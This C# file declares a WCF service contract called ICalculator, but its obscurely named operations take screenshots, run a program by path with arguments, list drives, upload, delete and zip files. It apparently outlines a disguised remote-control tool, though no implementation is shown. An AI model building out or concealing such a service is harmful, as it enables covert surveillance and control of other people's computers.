using System.IO;
using System.ServiceModel;

namespace Sp.Ced.Serv;

[ServiceContract(Namespace = "http://Sp.Ced.Serv")]
public interface ICalculator
{
	[OperationContract]
	Shots A();

	[OperationContract]
	Shots B();

	[OperationContract]
	string C(string path, string arg);

	[OperationContract]
	string D(string path);

	[OperationContract]
	string E(int time);

	[OperationContract]
	string F();

	[OperationContract]
	string G();

	[OperationContract]
	DriveInfo[] H();

	[OperationContract]
	string L();

	[OperationContract]
	string M(byte[][] files);

	[OperationContract]
	string N();

	[OperationContract]
	string O();

	[OperationContract]
	string P();

	[OperationContract]
	string R(byte[] file);

	[OperationContract]
	string Q();

	[OperationContract]
	string U(byte[] files);

	[OperationContract]
	string FTO(string path);

	[OperationContract]
	string FTF();

	[OperationContract]
	string Del(string path);

	[OperationContract]
	string Zip(string path);
}
